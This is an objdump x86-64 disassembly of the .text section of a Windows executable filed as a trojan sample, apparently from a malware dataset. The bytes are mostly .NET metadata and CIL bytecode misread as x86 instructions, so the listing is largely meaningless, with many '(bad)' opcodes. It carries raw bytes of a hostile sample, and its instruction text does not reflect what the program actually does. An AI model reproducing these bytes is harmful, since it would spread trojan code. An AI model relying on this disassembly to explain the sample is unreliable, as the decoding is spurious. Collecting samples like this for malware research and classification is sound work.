
malware_samples/trojan/e84d460480b190d7147880984e300ca2e755bde57c95e479b93c41d35930026a.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140002000 <.text>:
   140002000:	48 00 00             	rex.W add %al,(%rax)
   140002003:	00 02                	add    %al,(%rdx)
   140002005:	00 05 00 20 22 00    	add    %al,0x222000(%rip)        # 0x14022400b
   14000200b:	00 dc                	add    %bl,%ah
   14000200d:	0f 00 00             	sldt   (%rax)
   140002010:	01 00                	add    %eax,(%rax)
   140002012:	00 00                	add    %al,(%rax)
   140002014:	01 00                	add    %eax,(%rax)
   140002016:	00 06                	add    %al,(%rsi)
	...
   140002050:	1b 30                	sbb    (%rax),%esi
   140002052:	06                   	(bad)
   140002053:	00 a0 01 00 00 01    	add    %ah,0x1000001(%rax)
   140002059:	00 00                	add    %al,(%rax)
   14000205b:	11 16                	adc    %edx,(%rsi)
   14000205d:	0a 14 0b             	or     (%rbx,%rcx,1),%dl
   140002060:	73 11                	jae    0x140002073
   140002062:	00 00                	add    %al,(%rax)
   140002064:	0a 0c 73             	or     (%rbx,%rsi,2),%cl
   140002067:	12 00                	adc    (%rax),%al
   140002069:	00 0a                	add    %cl,(%rdx)
   14000206b:	0d 73 12 00 00       	or     $0x1273,%eax
   140002070:	0a 13                	or     (%rbx),%dl
   140002072:	04 28                	add    $0x28,%al
   140002074:	02 00                	add    (%rax),%al
   140002076:	00 06                	add    %al,(%rsi)
   140002078:	72 01                	jb     0x14000207b
   14000207a:	00 00                	add    %al,(%rax)
   14000207c:	70 28                	jo     0x1400020a6
   14000207e:	13 00                	adc    (%rax),%eax
   140002080:	00 0a                	add    %cl,(%rdx)
   140002082:	12 01                	adc    (%rcx),%al
   140002084:	17                   	(bad)
   140002085:	16                   	(bad)
   140002086:	8d 16                	lea    (%rsi),%edx
   140002088:	00 00                	add    %al,(%rax)
   14000208a:	01 28                	add    %ebp,(%rax)
   14000208c:	01 00                	add    %eax,(%rax)
   14000208e:	00 2b                	add    %ch,(%rbx)
   140002090:	26 28 15 00 00 0a 6f 	es sub %dl,0x6f0a0000(%rip)        # 0x1af0a2097
   140002097:	16                   	(bad)
   140002098:	00 00                	add    %al,(%rax)
   14000209a:	0a 28                	or     (%rax),%ch
   14000209c:	17                   	(bad)
   14000209d:	00 00                	add    %al,(%rax)
   14000209f:	0a 72 4f             	or     0x4f(%rdx),%dh
   1400020a2:	00 00                	add    %al,(%rax)
   1400020a4:	70 28                	jo     0x1400020ce
   1400020a6:	18 00                	sbb    %al,(%rax)
   1400020a8:	00 0a                	add    %cl,(%rdx)
   1400020aa:	13 05 09 6f 19 00    	adc    0x196f09(%rip),%eax        # 0x140198fb9
   1400020b0:	00 0a                	add    %cl,(%rdx)
   1400020b2:	28 1a                	sub    %bl,(%rdx)
   1400020b4:	00 00                	add    %al,(%rax)
   1400020b6:	0a 28                	or     (%rax),%ch
   1400020b8:	02 00                	add    (%rax),%al
   1400020ba:	00 2b                	add    %ch,(%rbx)
   1400020bc:	0c 16                	or     $0x16,%al
   1400020be:	13 06                	adc    (%rsi),%eax
   1400020c0:	38 c6                	cmp    %al,%dh
   1400020c2:	00 00                	add    %al,(%rax)
   1400020c4:	00 09                	add    %cl,(%rcx)
   1400020c6:	08 11                	or     %dl,(%rcx)
   1400020c8:	06                   	(bad)
   1400020c9:	6f                   	outsl  (%rsi),(%dx)
   1400020ca:	1c 00                	sbb    $0x0,%al
   1400020cc:	00 0a                	add    %cl,(%rdx)
   1400020ce:	6f                   	outsl  (%rsi),(%dx)
   1400020cf:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
   1400020d4:	1e                   	(bad)
   1400020d5:	00 00                	add    %al,(%rax)
   1400020d7:	0a 08                	or     (%rax),%cl
   1400020d9:	11 06                	adc    %eax,(%rsi)
   1400020db:	6f                   	outsl  (%rsi),(%dx)
   1400020dc:	1c 00                	sbb    $0x0,%al
   1400020de:	00 0a                	add    %cl,(%rdx)
   1400020e0:	6f                   	outsl  (%rsi),(%dx)
   1400020e1:	1f                   	(bad)
   1400020e2:	00 00                	add    %al,(%rax)
   1400020e4:	0a 72 67             	or     0x67(%rdx),%dh
   1400020e7:	00 00                	add    %al,(%rax)
   1400020e9:	70 28                	jo     0x140002113
   1400020eb:	20 00                	and    %al,(%rax)
   1400020ed:	00 0a                	add    %cl,(%rdx)
   1400020ef:	39 91 00 00 00 11    	cmp    %edx,0x11000000(%rcx)
   1400020f5:	04 08                	add    $0x8,%al
   1400020f7:	11 06                	adc    %eax,(%rsi)
   1400020f9:	6f                   	outsl  (%rsi),(%dx)
   1400020fa:	1c 00                	sbb    $0x0,%al
   1400020fc:	00 0a                	add    %cl,(%rdx)
   1400020fe:	6f                   	outsl  (%rsi),(%dx)
   1400020ff:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
   140002104:	21 00                	and    %eax,(%rax)
   140002106:	00 0a                	add    %cl,(%rdx)
   140002108:	15 33 7a 11 05       	adc    $0x5117a33,%eax
   14000210d:	28 13                	sub    %dl,(%rbx)
   14000210f:	00 00                	add    %al,(%rax)
   140002111:	0a 08                	or     (%rax),%cl
   140002113:	11 06                	adc    %eax,(%rsi)
   140002115:	6f                   	outsl  (%rsi),(%dx)
   140002116:	1c 00                	sbb    $0x0,%al
   140002118:	00 0a                	add    %cl,(%rdx)
   14000211a:	6f                   	outsl  (%rsi),(%dx)
   14000211b:	1d 00 00 0a 0a       	sbb    $0xa0a0000,%eax
   140002120:	72 73                	jb     0x140002195
   140002122:	00 00                	add    %al,(%rax)
   140002124:	70 06                	jo     0x14000212c
   140002126:	8c 20                	mov    %fs,(%rax)
   140002128:	00 00                	add    %al,(%rax)
   14000212a:	01 28                	add    %ebp,(%rax)
   14000212c:	22 00                	and    (%rax),%al
   14000212e:	00 0a                	add    %cl,(%rdx)
   140002130:	06                   	(bad)
   140002131:	11 05 11 05 17 8d    	adc    %eax,-0x72e8faef(%rip)        # 0xcd172648
   140002137:	01 00                	add    %eax,(%rax)
   140002139:	00 01                	add    %al,(%rcx)
   14000213b:	13 09                	adc    (%rcx),%ecx
   14000213d:	11 09                	adc    %ecx,(%rcx)
   14000213f:	16                   	(bad)
   140002140:	07                   	(bad)
   140002141:	a2 11 09 28 23 00 00 	movabs %al,0x110a000023280911
   140002148:	0a 11 
   14000214a:	04 08                	add    $0x8,%al
   14000214c:	11 06                	adc    %eax,(%rsi)
   14000214e:	6f                   	outsl  (%rsi),(%dx)
   14000214f:	1c 00                	sbb    $0x0,%al
   140002151:	00 0a                	add    %cl,(%rdx)
   140002153:	6f                   	outsl  (%rsi),(%dx)
   140002154:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
   140002159:	1e                   	(bad)
   14000215a:	00 00                	add    %al,(%rax)
   14000215c:	0a de                	or     %dh,%bl
   14000215e:	26 13 07             	es adc (%rdi),%eax
   140002161:	1f                   	(bad)
   140002162:	0c 28                	or     $0x28,%al
   140002164:	24 00                	and    $0x0,%al
   140002166:	00 0a                	add    %cl,(%rdx)
   140002168:	72 c7                	jb     0x140002131
   14000216a:	00 00                	add    %al,(%rax)
   14000216c:	70 28                	jo     0x140002196
   14000216e:	13 00                	adc    (%rax),%eax
   140002170:	00 0a                	add    %cl,(%rdx)
   140002172:	28 25 00 00 0a 11    	sub    %ah,0x110a0000(%rip)        # 0x1510a2178
   140002178:	07                   	(bad)
   140002179:	6f                   	outsl  (%rsi),(%dx)
   14000217a:	26 00 00             	es add %al,(%rax)
   14000217d:	0a 28                	or     (%rax),%ch
   14000217f:	13 00                	adc    (%rax),%eax
   140002181:	00 0a                	add    %cl,(%rdx)
   140002183:	de 00                	fiadds (%rax)
   140002185:	11 06                	adc    %eax,(%rsi)
   140002187:	17                   	(bad)
   140002188:	58                   	pop    %rax
   140002189:	13 06                	adc    (%rsi),%eax
   14000218b:	11 06                	adc    %eax,(%rsi)
   14000218d:	08 6f 27             	or     %ch,0x27(%rdi)
   140002190:	00 00                	add    %al,(%rax)
   140002192:	0a 3f                	or     (%rdi),%bh
   140002194:	2d ff ff ff 16       	sub    $0x16ffffff,%eax
   140002199:	13 08                	adc    (%rax),%ecx
   14000219b:	2b 45 09             	sub    0x9(%rbp),%eax
   14000219e:	11 04 11             	adc    %eax,(%rcx,%rdx,1)
   1400021a1:	08 6f 28             	or     %ch,0x28(%rdi)
   1400021a4:	00 00                	add    %al,(%rax)
   1400021a6:	0a 6f 21             	or     0x21(%rdi),%ch
   1400021a9:	00 00                	add    %al,(%rax)
   1400021ab:	0a 15 33 2d 72 2f    	or     0x2f722d33(%rip),%dl        # 0x16f724ee4
   1400021b1:	01 00                	add    %eax,(%rax)
   1400021b3:	70 11                	jo     0x1400021c6
   1400021b5:	04 11                	add    $0x11,%al
   1400021b7:	08 6f 28             	or     %ch,0x28(%rdi)
   1400021ba:	00 00                	add    %al,(%rax)
   1400021bc:	0a 13                	or     (%rbx),%dl
   1400021be:	0a 12                	or     (%rdx),%dl
   1400021c0:	0a 28                	or     (%rax),%ch
   1400021c2:	29 00                	sub    %eax,(%rax)
   1400021c4:	00 0a                	add    %cl,(%rdx)
   1400021c6:	28 22                	sub    %ah,(%rdx)
   1400021c8:	00 00                	add    %al,(%rax)
   1400021ca:	0a 11                	or     (%rcx),%dl
   1400021cc:	04 11                	add    $0x11,%al
   1400021ce:	04 11                	add    $0x11,%al
   1400021d0:	08 6f 28             	or     %ch,0x28(%rdi)
   1400021d3:	00 00                	add    %al,(%rax)
   1400021d5:	0a 6f 2a             	or     0x2a(%rdi),%ch
   1400021d8:	00 00                	add    %al,(%rax)
   1400021da:	0a 26                	or     (%rsi),%ah
   1400021dc:	11 08                	adc    %ecx,(%rax)
   1400021de:	17                   	(bad)
   1400021df:	58                   	pop    %rax
   1400021e0:	13 08                	adc    (%rax),%ecx
   1400021e2:	11 08                	adc    %ecx,(%rax)
   1400021e4:	11 04 6f             	adc    %eax,(%rdi,%rbp,2)
   1400021e7:	2b 00                	sub    (%rax),%eax
   1400021e9:	00 0a                	add    %cl,(%rdx)
   1400021eb:	32 b0 20 b8 0b 00    	xor    0xbb820(%rax),%dh
   1400021f1:	00 28                	add    %ch,(%rax)
   1400021f3:	2c 00                	sub    $0x0,%al
   1400021f5:	00 0a                	add    %cl,(%rdx)
   1400021f7:	38 b0 fe ff ff 01    	cmp    %dh,0x1fffffe(%rax)
   1400021fd:	10 00                	adc    %al,(%rax)
   1400021ff:	00 00                	add    %al,(%rax)
   140002201:	00 af 00 54 03 01    	add    %ch,0x1035400(%rdi)
   140002207:	26 23 00             	es and (%rax),%eax
   14000220a:	00 01                	add    %al,(%rcx)
   14000220c:	2e 72 65             	jb,pn  0x140002274
   14000220f:	01 00                	add    %eax,(%rax)
   140002211:	70 28                	jo     0x14000223b
   140002213:	13 00                	adc    (%rax),%eax
   140002215:	00 0a                	add    %cl,(%rdx)
   140002217:	2a 1e                	sub    (%rsi),%bl
   140002219:	02 28                	add    (%rax),%ch
   14000221b:	2d 00 00 0a 2a       	sub    $0x2a0a0000,%eax
   140002220:	42 53                	rex.X push %rbx
   140002222:	4a                   	rex.WX
   140002223:	42 01 00             	rex.X add %eax,(%rax)
   140002226:	01 00                	add    %eax,(%rax)
   140002228:	00 00                	add    %al,(%rax)
   14000222a:	00 00                	add    %al,(%rax)
   14000222c:	0c 00                	or     $0x0,%al
   14000222e:	00 00                	add    %al,(%rax)
   140002230:	76 34                	jbe    0x140002266
   140002232:	2e 30 2e             	cs xor %ch,(%rsi)
   140002235:	33 30                	xor    (%rax),%esi
   140002237:	33 31                	xor    (%rcx),%esi
   140002239:	39 00                	cmp    %eax,(%rax)
   14000223b:	00 00                	add    %al,(%rax)
   14000223d:	00 05 00 6c 00 00    	add    %al,0x6c00(%rip)        # 0x140008e43
   140002243:	00 70 03             	add    %dh,0x3(%rax)
   140002246:	00 00                	add    %al,(%rax)
   140002248:	23 7e 00             	and    0x0(%rsi),%edi
   14000224b:	00 dc                	add    %bl,%ah
   14000224d:	03 00                	add    (%rax),%eax
   14000224f:	00 ec                	add    %ch,%ah
   140002251:	04 00                	add    $0x0,%al
   140002253:	00 23                	add    %ah,(%rbx)
   140002255:	53                   	push   %rbx
   140002256:	74 72                	je     0x1400022ca
   140002258:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%rsi),%ebp
   14000225f:	00 c8                	add    %cl,%al
   140002261:	08 00                	or     %al,(%rax)
   140002263:	00 38                	add    %bh,(%rax)
   140002265:	05 00 00 23 55       	add    $0x55230000,%eax
   14000226a:	53                   	push   %rbx
   14000226b:	00 00                	add    %al,(%rax)
   14000226d:	0e                   	(bad)
   14000226e:	00 00                	add    %al,(%rax)
   140002270:	10 00                	adc    %al,(%rax)
   140002272:	00 00                	add    %al,(%rax)
   140002274:	23 47 55             	and    0x55(%rdi),%eax
   140002277:	49                   	rex.WB
   140002278:	44 00 00             	add    %r8b,(%rax)
   14000227b:	00 10                	add    %dl,(%rax)
   14000227d:	0e                   	(bad)
   14000227e:	00 00                	add    %al,(%rax)
   140002280:	cc                   	int3
   140002281:	01 00                	add    %eax,(%rax)
   140002283:	00 23                	add    %ah,(%rbx)
   140002285:	42 6c                	rex.X insb (%dx),(%rdi)
   140002287:	6f                   	outsl  (%rsi),(%dx)
   140002288:	62                   	(bad)
   140002289:	00 00                	add    %al,(%rax)
   14000228b:	00 00                	add    %al,(%rax)
   14000228d:	00 00                	add    %al,(%rax)
   14000228f:	00 02                	add    %al,(%rdx)
   140002291:	00 00                	add    %al,(%rax)
   140002293:	01 47 15             	add    %eax,0x15(%rdi)
   140002296:	02 08                	add    (%rax),%cl
   140002298:	09 08                	or     %ecx,(%rax)
   14000229a:	00 00                	add    %al,(%rax)
   14000229c:	00 fa                	add    %bh,%dl
   14000229e:	25 33 00 16 00       	and    $0x160033,%eax
   1400022a3:	00 01                	add    %al,(%rcx)
   1400022a5:	00 00                	add    %al,(%rax)
   1400022a7:	00 23                	add    %ah,(%rbx)
   1400022a9:	00 00                	add    %al,(%rax)
   1400022ab:	00 02                	add    %al,(%rdx)
   1400022ad:	00 00                	add    %al,(%rax)
   1400022af:	00 03                	add    %al,(%rbx)
   1400022b1:	00 00                	add    %al,(%rax)
   1400022b3:	00 01                	add    %al,(%rcx)
   1400022b5:	00 00                	add    %al,(%rax)
   1400022b7:	00 2d 00 00 00 0e    	add    %ch,0xe000000(%rip)        # 0x14e0022bd
   1400022bd:	00 00                	add    %al,(%rax)
   1400022bf:	00 01                	add    %al,(%rcx)
   1400022c1:	00 00                	add    %al,(%rax)
   1400022c3:	00 02                	add    %al,(%rdx)
   1400022c5:	00 00                	add    %al,(%rax)
   1400022c7:	00 01                	add    %al,(%rcx)
   1400022c9:	00 00                	add    %al,(%rax)
   1400022cb:	00 06                	add    %al,(%rsi)
   1400022cd:	00 00                	add    %al,(%rax)
   1400022cf:	00 02                	add    %al,(%rdx)
   1400022d1:	00 00                	add    %al,(%rax)
   1400022d3:	00 00                	add    %al,(%rax)
   1400022d5:	00 0a                	add    %cl,(%rdx)
   1400022d7:	00 01                	add    %al,(%rcx)
   1400022d9:	00 00                	add    %al,(%rax)
   1400022db:	00 00                	add    %al,(%rax)
   1400022dd:	00 06                	add    %al,(%rsi)
   1400022df:	00 42 00             	add    %al,0x0(%rdx)
   1400022e2:	3b 00                	cmp    (%rax),%eax
   1400022e4:	06                   	(bad)
   1400022e5:	00 80 00 66 00 06    	add    %al,0x6006600(%rax)
   1400022eb:	00 ab 00 99 00 06    	add    %ch,0x6009900(%rbx)
   1400022f1:	00 c2                	add    %al,%dl
   1400022f3:	00 99 00 06 00 df    	add    %bl,-0x20fffa00(%rcx)
   1400022f9:	00 99 00 06 00 fe    	add    %bl,-0x1fffa00(%rcx)
   1400022ff:	00 99 00 06 00 17    	add    %bl,0x17000600(%rcx)
   140002305:	01 99 00 06 00 30    	add    %ebx,0x30000600(%rcx)
   14000230b:	01 99 00 06 00 4b    	add    %ebx,0x4b000600(%rcx)
   140002311:	01 99 00 06 00 66    	add    %ebx,0x66000600(%rcx)
   140002317:	01 99 00 06 00 9e    	add    %ebx,-0x61fffa00(%rcx)
   14000231d:	01 7f 01             	add    %edi,0x1(%rdi)
   140002320:	06                   	(bad)
   140002321:	00 b2 01 7f 01 06    	add    %dh,0x6017f01(%rdx)
   140002327:	00 c0                	add    %al,%al
   140002329:	01 99 00 06 00 d9    	add    %ebx,-0x26fffa00(%rcx)
   14000232f:	01 99 00 06 00 09    	add    %ebx,0x9000600(%rcx)
   140002335:	02 f6                	add    %dh,%dh
   140002337:	01 3f                	add    %edi,(%rdi)
   140002339:	00 1d 02 00 00 06    	add    %bl,0x6000002(%rip)        # 0x146002341
   14000233f:	00 4c 02 2c          	add    %cl,0x2c(%rdx,%rax,1)
   140002343:	02 06                	add    (%rsi),%al
   140002345:	00 6c 02 2c          	add    %ch,0x2c(%rdx,%rax,1)
   140002349:	02 06                	add    (%rsi),%al
   14000234b:	00 a5 02 8a 02 0a    	add    %ah,0xa028a02(%rbp)
   140002351:	00 ac 02 f6 01 06 00 	add    %ch,0x601f6(%rdx,%rax,1)
   140002358:	b4 02                	mov    $0x2,%ah
   14000235a:	3b 00                	cmp    (%rax),%eax
   14000235c:	06                   	(bad)
   14000235d:	00 e0                	add    %ah,%al
   14000235f:	02 c6                	add    %dh,%al
   140002361:	02 0e                	add    (%rsi),%cl
   140002363:	00 fa                	add    %bh,%dl
   140002365:	02 f1                	add    %cl,%dh
   140002367:	02 12                	add    (%rdx),%dl
   140002369:	00 45 03             	add    %al,0x3(%rbp)
   14000236c:	20 03                	and    %al,(%rbx)
   14000236e:	06                   	(bad)
   14000236f:	00 56 03             	add    %dl,0x3(%rsi)
   140002372:	08 03                	or     %al,(%rbx)
   140002374:	16                   	(bad)
   140002375:	00 82 03 7a 03 06    	add    %al,0x6037a03(%rdx)
   14000237b:	00 92 03 99 00 06    	add    %dl,0x6009903(%rdx)
   140002381:	00 c7                	add    %al,%bh
   140002383:	03 bd 03 1a 00 10    	add    0x10001a03(%rbp),%edi
   140002389:	04 04                	add    $0x4,%al
   14000238b:	04 06                	add    $0x6,%al
   14000238d:	00 1b                	add    %bl,(%rbx)
   14000238f:	04 8a                	add    $0x8a,%al
   140002391:	02 06                	add    (%rsi),%al
   140002393:	00 54 04 3b          	add    %dl,0x3b(%rsp,%rax,1)
   140002397:	00 06                	add    %al,(%rsi)
   140002399:	00 6f 04             	add    %ch,0x4(%rdi)
   14000239c:	3b 00                	cmp    (%rax),%eax
   14000239e:	06                   	(bad)
   14000239f:	00 7c 04 3b          	add    %bh,0x3b(%rsp,%rax,1)
   1400023a3:	00 06                	add    %al,(%rsi)
   1400023a5:	00 d3                	add    %dl,%bl
   1400023a7:	04 c2                	add    $0xc2,%al
   1400023a9:	04 06                	add    $0x6,%al
   1400023ab:	00 e0                	add    %ah,%al
   1400023ad:	04 3b                	add    $0x3b,%al
   1400023af:	00 00                	add    %al,(%rax)
   1400023b1:	00 00                	add    %al,(%rax)
   1400023b3:	00 01                	add    %al,(%rcx)
   1400023b5:	00 00                	add    %al,(%rax)
   1400023b7:	00 00                	add    %al,(%rax)
   1400023b9:	00 01                	add    %al,(%rcx)
   1400023bb:	00 01                	add    %al,(%rcx)
   1400023bd:	00 00                	add    %al,(%rax)
   1400023bf:	00 10                	add    %dl,(%rax)
   1400023c1:	00 1c 00             	add    %bl,(%rax,%rax,1)
   1400023c4:	24 00                	and    $0x0,%al
   1400023c6:	05 00 01 00 01       	add    $0x1000100,%eax
   1400023cb:	00 50 20             	add    %dl,0x20(%rax)
   1400023ce:	00 00                	add    %al,(%rax)
   1400023d0:	00 00                	add    %al,(%rax)
   1400023d2:	91                   	xchg   %eax,%ecx
   1400023d3:	00 49 00             	add    %cl,0x0(%rcx)
   1400023d6:	0a 00                	or     (%rax),%al
   1400023d8:	01 00                	add    %eax,(%rax)
   1400023da:	0c 22                	or     $0x22,%al
   1400023dc:	00 00                	add    %al,(%rax)
   1400023de:	00 00                	add    %al,(%rax)
   1400023e0:	91                   	xchg   %eax,%ecx
   1400023e1:	00 4e 00             	add    %cl,0x0(%rsi)
   1400023e4:	10 00                	adc    %al,(%rax)
   1400023e6:	02 00                	add    (%rax),%al
   1400023e8:	18 22                	sbb    %ah,(%rdx)
   1400023ea:	00 00                	add    %al,(%rax)
   1400023ec:	00 00                	add    %al,(%rax)
   1400023ee:	86 18                	xchg   %bl,(%rax)
   1400023f0:	5b                   	pop    %rbx
   1400023f1:	00 14 00             	add    %dl,(%rax,%rax,1)
   1400023f4:	02 00                	add    (%rax),%al
   1400023f6:	00 00                	add    %al,(%rax)
   1400023f8:	01 00                	add    %eax,(%rax)
   1400023fa:	61                   	(bad)
   1400023fb:	00 11                	add    %dl,(%rcx)
   1400023fd:	00 5b 00             	add    %bl,0x0(%rbx)
   140002400:	18 00                	sbb    %al,(%rax)
   140002402:	19 00                	sbb    %eax,(%rax)
   140002404:	5b                   	pop    %rbx
   140002405:	00 18                	add    %bl,(%rax)
   140002407:	00 21                	add    %ah,(%rcx)
   140002409:	00 5b 00             	add    %bl,0x0(%rbx)
   14000240c:	18 00                	sbb    %al,(%rax)
   14000240e:	29 00                	sub    %eax,(%rax)
   140002410:	5b                   	pop    %rbx
   140002411:	00 18                	add    %bl,(%rax)
   140002413:	00 31                	add    %dh,(%rcx)
   140002415:	00 5b 00             	add    %bl,0x0(%rbx)
   140002418:	18 00                	sbb    %al,(%rax)
   14000241a:	39 00                	cmp    %eax,(%rax)
   14000241c:	5b                   	pop    %rbx
   14000241d:	00 18                	add    %bl,(%rax)
   14000241f:	00 41 00             	add    %al,0x0(%rcx)
   140002422:	5b                   	pop    %rbx
   140002423:	00 18                	add    %bl,(%rax)
   140002425:	00 49 00             	add    %cl,0x0(%rcx)
   140002428:	5b                   	pop    %rbx
   140002429:	00 18                	add    %bl,(%rax)
   14000242b:	00 51 00             	add    %dl,0x0(%rcx)
   14000242e:	5b                   	pop    %rbx
   14000242f:	00 18                	add    %bl,(%rax)
   140002431:	00 59 00             	add    %bl,0x0(%rcx)
   140002434:	5b                   	pop    %rbx
   140002435:	00 1d 00 61 00 5b    	add    %bl,0x5b006100(%rip)        # 0x19b00853b
   14000243b:	00 18                	add    %bl,(%rax)
   14000243d:	00 69 00             	add    %ch,0x0(%rcx)
   140002440:	5b                   	pop    %rbx
   140002441:	00 18                	add    %bl,(%rax)
   140002443:	00 71 00             	add    %dh,0x0(%rcx)
   140002446:	5b                   	pop    %rbx
   140002447:	00 18                	add    %bl,(%rax)
   140002449:	00 79 00             	add    %bh,0x0(%rcx)
   14000244c:	5b                   	pop    %rbx
   14000244d:	00 22                	add    %ah,(%rdx)
   14000244f:	00 89 00 5b 00 28    	add    %cl,0x28005b00(%rcx)
   140002455:	00 91 00 5b 00 14    	add    %dl,0x14005b00(%rcx)
   14000245b:	00 0c 00             	add    %cl,(%rax,%rax,1)
   14000245e:	5b                   	pop    %rbx
   14000245f:	00 14 00             	add    %dl,(%rax,%rax,1)
   140002462:	14 00                	adc    $0x0,%al
   140002464:	5b                   	pop    %rbx
   140002465:	00 14 00             	add    %dl,(%rax,%rax,1)
   140002468:	a9 00 bc 02 3a       	test   $0x3a02bc00,%eax
   14000246d:	00 b9 00 6a 03 48    	add    %bh,0x48036a00(%rcx)
   140002473:	00 d9                	add    %bl,%cl
   140002475:	00 9b 03 5a 00 d9    	add    %bl,-0x26ffa5fd(%rbx)
   14000247b:	00 b0 03 5f 00 e1    	add    %dh,-0x1effa0fd(%rax)
   140002481:	00 cc                	add    %cl,%ah
   140002483:	03 63 00             	add    0x0(%rbx),%esp
   140002486:	e1 00                	loope  0x140002488
   140002488:	dd 03                	fldl   (%rbx)
   14000248a:	68 00 14 00 e5       	push   $0xffffffffe5001400
   14000248f:	03 14 00             	add    (%rax,%rax,1),%edx
   140002492:	a1 00 eb 03 6e 00 e9 	movabs 0x2900e9006e03eb00,%eax
   140002499:	00 29 
   14000249b:	04 74                	add    $0x74,%al
   14000249d:	00 0c 00             	add    %cl,(%rax,%rax,1)
   1400024a0:	30 04 89             	xor    %al,(%rcx,%rcx,4)
   1400024a3:	00 a1 00 39 04 8f    	add    %ah,-0x70fbc700(%rcx)
   1400024a9:	00 14 00             	add    %dl,(%rax,%rax,1)
   1400024ac:	40 04 93             	rex add $0x93,%al
   1400024af:	00 a1 00 44 04 5f    	add    %ah,0x5f044400(%rcx)
   1400024b5:	00 f9                	add    %bh,%cl
   1400024b7:	00 5b 04             	add    %bl,0x4(%rbx)
   1400024ba:	99                   	cltd
   1400024bb:	00 14 00             	add    %dl,(%rax,%rax,1)
   1400024be:	67 04 9f             	addr32 add $0x9f,%al
   1400024c1:	00 a9 00 bc 02 a5    	add    %ch,-0x5afd4400(%rcx)
   1400024c7:	00 b9 00 75 04 ab    	add    %bh,-0x54fb8b00(%rcx)
   1400024cd:	00 a9 00 89 04 b4    	add    %ch,-0x4bfb7700(%rcx)
   1400024d3:	00 a9 00 9d 04 10    	add    %ch,0x10049d00(%rcx)
   1400024d9:	00 09                	add    %cl,(%rcx)
   1400024db:	00 a8 04 5f 00 0c    	add    %ch,0xc005f04(%rax)
   1400024e1:	00 b1 04 8f 00 14    	add    %dh,0x14008f04(%rcx)
   1400024e7:	00 30                	add    %dh,(%rax)
   1400024e9:	04 89                	add    $0x89,%al
   1400024eb:	00 01                	add    %al,(%rcx)
   1400024ed:	01 a8 04 5f 00 14    	add    %ebp,0x14005f04(%rax)
   1400024f3:	00 bb 04 bb 00 14    	add    %bh,0x1400bb04(%rbx)
   1400024f9:	00 b1 04 8f 00 11    	add    %dh,0x11008f04(%rcx)
   1400024ff:	01 da                	add    %ebx,%edx
   140002501:	04 c1                	add    $0xc1,%al
   140002503:	00 09                	add    %cl,(%rcx)
   140002505:	00 5b 00             	add    %bl,0x0(%rbx)
   140002508:	14 00                	adc    $0x0,%al
   14000250a:	2e 00 0b             	cs add %cl,(%rbx)
   14000250d:	00 e4                	add    %ah,%ah
   14000250f:	00 2e                	add    %ch,(%rsi)
   140002511:	00 13                	add    %dl,(%rbx)
   140002513:	00 32                	add    %dh,(%rdx)
   140002515:	01 2e                	add    %ebp,(%rsi)
   140002517:	00 1b                	add    %bl,(%rbx)
   140002519:	00 43 01             	add    %al,0x1(%rbx)
   14000251c:	2e 00 23             	cs add %ah,(%rbx)
   14000251f:	00 43 01             	add    %al,0x1(%rbx)
   140002522:	2e 00 2b             	cs add %ch,(%rbx)
   140002525:	00 43 01             	add    %al,0x1(%rbx)
   140002528:	2e 00 33             	cs add %dh,(%rbx)
   14000252b:	00 32                	add    %dh,(%rdx)
   14000252d:	01 2e                	add    %ebp,(%rsi)
   14000252f:	00 3b                	add    %bh,(%rbx)
   140002531:	00 49 01             	add    %cl,0x1(%rcx)
   140002534:	2e 00 43 00          	cs add %al,0x0(%rbx)
   140002538:	43 01 2e             	rex.XB add %ebp,(%r14)
   14000253b:	00 53 00             	add    %dl,0x0(%rbx)
   14000253e:	43 01 2e             	rex.XB add %ebp,(%r14)
   140002541:	00 5b 00             	add    %bl,0x0(%rbx)
   140002544:	61                   	(bad)
   140002545:	01 2e                	add    %ebp,(%rsi)
   140002547:	00 6b 00             	add    %ch,0x0(%rbx)
   14000254a:	8b 01                	mov    (%rcx),%eax
   14000254c:	2e 00 73 00          	cs add %dh,0x0(%rbx)
   140002550:	98                   	cwtl
   140002551:	01 2e                	add    %ebp,(%rsi)
   140002553:	00 7b 00             	add    %bh,0x0(%rbx)
   140002556:	a1 01 2e 00 83 00 aa 	movabs 0xc601aa0083002e01,%eax
   14000255d:	01 c6 
   14000255f:	00 2d 00 34 00 04    	add    %ch,0x4003400(%rip)        # 0x144005965
   140002565:	80 00 00             	addb   $0x0,(%rax)
   140002568:	01 00                	add    %eax,(%rax)
	...
   140002576:	24 00                	and    $0x0,%al
   140002578:	00 00                	add    %al,(%rax)
   14000257a:	04 00                	add    $0x0,%al
	...
   140002584:	00 00                	add    %al,(%rax)
   140002586:	01 00                	add    %eax,(%rax)
   140002588:	32 00                	xor    (%rax),%al
   14000258a:	00 00                	add    %al,(%rax)
   14000258c:	00 00                	add    %al,(%rax)
   14000258e:	04 00                	add    $0x0,%al
	...
   140002598:	00 00                	add    %al,(%rax)
   14000259a:	01 00                	add    %eax,(%rax)
   14000259c:	3b 00                	cmp    (%rax),%eax
   14000259e:	00 00                	add    %al,(%rax)
   1400025a0:	00 00                	add    %al,(%rax)
   1400025a2:	02 00                	add    (%rax),%al
   1400025a4:	07                   	(bad)
   1400025a5:	00 93 17 00 00 00    	add    %dl,0x17(%rbx)
   1400025ab:	00 00                	add    %al,(%rax)
   1400025ad:	00 3f                	add    %bh,(%rdi)
   1400025af:	00 f1                	add    %dh,%cl
   1400025b1:	02 00                	add    (%rax),%al
   1400025b3:	00 00                	add    %al,(%rax)
   1400025b5:	00 04 00             	add    %al,(%rax,%rax,1)
	...
   1400025c0:	00 00                	add    %al,(%rax)
   1400025c2:	01 00                	add    %eax,(%rax)
   1400025c4:	08 03                	or     %al,(%rbx)
   1400025c6:	00 00                	add    %al,(%rax)
   1400025c8:	00 00                	add    %al,(%rax)
   1400025ca:	01 00                	add    %eax,(%rax)
	...
   1400025d8:	7a 03                	jp     0x1400025dd
   1400025da:	00 00                	add    %al,(%rax)
   1400025dc:	00 00                	add    %al,(%rax)
   1400025de:	04 00                	add    $0x0,%al
	...
   1400025e8:	00 00                	add    %al,(%rax)
   1400025ea:	01 00                	add    %eax,(%rax)
   1400025ec:	f8                   	clc
   1400025ed:	03 00                	add    (%rax),%eax
   1400025ef:	00 00                	add    %al,(%rax)
   1400025f1:	00 29                	add    %ch,(%rcx)
